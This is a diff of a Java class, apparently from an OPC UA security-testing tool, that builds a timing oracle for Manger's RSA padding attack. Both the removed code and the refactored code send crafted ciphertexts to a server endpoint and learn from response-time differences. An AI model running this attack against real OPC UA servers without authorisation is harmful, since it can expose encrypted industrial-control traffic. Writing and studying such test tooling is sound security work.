@@ -1,153 +1,79 @@
 package attacks.manger.oracle.learner;
 
-import attacks.CipherTextHelper;
+import attacks.manger.oracle.Oracle;
 import attacks.manger.oracle.OracleException;
-import opcua.context.Context;
-import opcua.message.ErrorMessage;
-import opcua.message.HelloMessage;
-import opcua.message.Message;
-import opcua.message.parts.MessageType;
-import opcua.util.MessageReceiver;
-import opcua.util.MessageSender;
-import smile.clustering.KMeans;
-import smile.plot.Palette;
-import smile.plot.PlotCanvas;
-import smile.plot.ScatterPlot;
-import transport.tcp.ClientTcpConnection;
+import attacks.manger.oracle.TimingOracle;
+import attacks.manger.oracle.VictimProxy;
+import attacks.manger.oracle.timing.DecisionRule;
+import attacks.manger.oracle.timing.LinearDecisionRule;
+import opcua.context.Endpoint;
+import opcua.context.LocalKeyPair;
+import opcua.encoding.EncodingException;
+import reporting.entry.Entry;
+import reporting.entry.Group;
+import reporting.entry.ThrowableEntry;
+import reporting.entry.ValueEntry;
+import transport.SecureChannelUtil;
 
-import javax.print.attribute.standard.OrientationRequested;
-import javax.swing.*;
-import java.awt.*;
-import java.io.FileWriter;
 import java.io.IOException;
-import java.math.BigInteger;
-import java.security.SecureRandom;
-import java.security.interfaces.RSAPublicKey;
-import java.util.*;
 
-public class TimingOracleLearner extends OracleLearner {
+/**
+ * Creates an oracle that leverages timing differences of an OPC UA implementation for Manger's attack
+ */
+public class TimingOracleLearner implements OracleLearner {
 
-    private final static int SAMPLE_SIZE = 512;
-    private final Context context;
-    private final byte[] validCipherText;
+    private final int sampleSize;
+    private final int rounds;
+    private final LocalKeyPair localKeyPair;
 
-    public TimingOracleLearner(Context context, byte[] validCipherText) {
-        this.context = context;
-        this.validCipherText = validCipherText;
+    /**
+     * Constructor
+     * @param sampleSize How many samples are gathered per ciphertext. These samples are filtered using a percentile
+     *                   determined at runtime.
+     * @param rounds How many random ciphertext should be evaluated for "<B" and ">=BB"
+     * @param localKeyPair Certificate and private key used for queries
+     */
+    public TimingOracleLearner(int sampleSize, int rounds, LocalKeyPair localKeyPair) {
+        this.sampleSize = sampleSize;
+        this.rounds = rounds;
+        this.localKeyPair = localKeyPair;
     }
 
     @Override
-    public LearningResult learn(int rounds) throws OracleException {
-
-        ClientTcpConnection connection = new ClientTcpConnection(context.getRemoteHostname(), context.getRemotePort(), 3000);
-        context.setConnection(connection);
-
-        byte[] cipherText = Arrays.copyOf(validCipherText, validCipherText.length);
-        int cipherBlockLength = ((RSAPublicKey) context.getRemoteCertificate().getPublicKey()).getModulus().bitLength() / 8;
-        int blockOffset;
+    public LearningResult learn(Endpoint endpoint) throws OracleException {
         try {
-            blockOffset = CipherTextHelper.getOpnBlockOffset(cipherText, (RSAPublicKey) context.getRemoteCertificate().getPublicKey());
-        } catch (IOException e) {
-            throw new OracleException("Unable to compute block offset", e);
+            byte[] validCiphertext = SecureChannelUtil.generateEncryptedOpnRequest(endpoint, localKeyPair);
+            VictimProxy victimProxy = new VictimProxy(endpoint, validCiphertext);
+            LinearDecisionRule rule = new LinearDecisionRule(victimProxy, rounds, sampleSize);
+            rule.learn();
+
+            Entry report = new Group("TimingOracleLearner")
+                    .addSubEntry(new ValueEntry<>("Successful", "n/a"))
+                    .addSubEntry(new ValueEntry<>("Timing Difference", Math.abs(rule.getDecisionBoundary().getEmpMeanLessB() - rule.getDecisionBoundary().getEmpMeanGeqB())))
+                    .addSubEntry(new ValueEntry<>("Empirical Mean for \"<B\"", rule.getDecisionBoundary().getEmpMeanLessB()))
+                    .addSubEntry(new ValueEntry<>("Empirical Mean for \">=B\"", rule.getDecisionBoundary().getEmpMeanGeqB()))
+                    .addSubEntry(new ValueEntry<>("Mean Empirical Standard Deviation", rule.getDecisionBoundary().getMeanEmpStandardDeviation()));
+            Oracle oracle = new TimingOracle(rule);
+
+            return new LearningResult(oracle, report);
         }
-        byte[] randomCipherBlock = new byte[cipherBlockLength];
-        SecureRandom secureRandom = new SecureRandom();
-
-        double[][] times = new double[rounds][2];   //We need to save each time value as 1-dimensional vector
-
-        /*
-         * We generate all cipher blocks beforehand. Therefore we can sequentially send the same blocks and compute the
-         * mean time between request and response for each block. This way we can bring down variance.
-         */
-        long[][] timeSamples = new long[rounds][SAMPLE_SIZE];
-        byte[][] blocks = new byte[rounds][cipherBlockLength];
-        for(int i = 0; i < rounds; i++) {
-            //Create random cipher block and make sure it is no larger than the servers RSA-modulus
-            do {
-                secureRandom.nextBytes(blocks[i]);
-            }
-            while((new BigInteger(1, blocks[i])).compareTo(((RSAPublicKey) context.getRemoteCertificate().getPublicKey()).getModulus()) > 0);
+        catch (IOException | EncodingException e) {
+            return createFailureResult("Unexpected exception", e);
         }
+    }
 
-        for(int j = 0; j < SAMPLE_SIZE; j++) {
-            for (int i = 0; i < rounds; i++) {
-                //Insert a random cipher block into the valid cipher text
-                CipherTextHelper.insertCipherBlock(cipherText, blocks[i], blockOffset, cipherBlockLength, 0);
+    private static LearningResult createFailureResult(String reason) {
+        Entry report = new Group("TimingOracleLearner")
+                .addSubEntry(new ValueEntry<>("Successful", false))
+                .addSubEntry(new ValueEntry<>("Reason", reason));
+        return new LearningResult(report);
+    }
 
-                try {
-                    connection.initialize();
-                    MessageSender.sendMessage(new HelloMessage(0, 8192, 8192, 8192, 256, context.getEndpointUrl()), context);
-                    Message ack = MessageReceiver.receiveMessage(context);
-                    if (ack == null || ack.getMessageType() != MessageType.ACK) {
-                        throw new OracleException("Unable to establish TCP connection");
-                    }
-
-                    // Constant time BEGIN
-                    long pre = System.nanoTime();
-                    MessageSender.sendBytes(cipherText, context);
-                    Message response = MessageReceiver.receiveMessage(context);
-                    long post = System.nanoTime();
-                    //Constant time END
-
-                    connection.close();
-
-                    synchronized (this) {
-                        try {
-                            this.wait(3);
-                        } catch (InterruptedException e) {
-                            e.printStackTrace();
-                        }
-                    }
-
-                    if (response == null || response.getMessageType() != MessageType.ERR) {
-                        throw new OracleException("Invalid response");
-                    }
-                    timeSamples[i][j] = post - pre;
-
-
-
-                } catch (IOException e) {
-                    throw new OracleException(e);
-                }
-            }
-
-            System.out.println(j);
-        }
-
-        //Calculate median of sample
-        double[][] data = new double[rounds][2];    //Dimension of 2 needed for plot
-        for(int i = 0; i < rounds; i++) {
-            Arrays.sort(timeSamples[i]);
-            /*
-            if(SAMPLE_SIZE % 2 == 0) {
-                data[i][0] = ((double)(timeSamples[i][SAMPLE_SIZE/2 - 1] + timeSamples[i][SAMPLE_SIZE/2]))/2;
-            } else {
-                data[i][0] = (double)timeSamples[i][SAMPLE_SIZE/2];
-            }
-            */
-
-
-            long sum = 0;
-            for(int j = SAMPLE_SIZE /4; j < 3*SAMPLE_SIZE/4; j++) {
-                sum += timeSamples[i][j];
-            }
-            data[i][0] = ((double)sum)/(SAMPLE_SIZE/2);
-
-
-        }
-
-        KMeans kMeans = new KMeans(data, 2, 1000, 1000);
-
-        PlotCanvas plot = ScatterPlot.plot(data, kMeans.getClusterLabel(), 'x', Palette.COLORS);
-        plot.points(kMeans.centroids(), '@');
-
-        JFrame f = new JFrame("K-Means");
-        f.setSize(new Dimension(1920, 1080));
-        f.setLocationRelativeTo( null );
-        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
-        f.getContentPane().add(plot);
-        f.setVisible(true);
-
-        return null;
+    private static LearningResult createFailureResult(String reason, Throwable e) {
+        Entry report = new Group("TimingOracleLearner")
+                .addSubEntry(new ValueEntry<>("Successful", false))
+                .addSubEntry(new ValueEntry<>("Reason", reason))
+                .addSubEntry(new ThrowableEntry(e));
+        return new LearningResult(report);
     }
 }
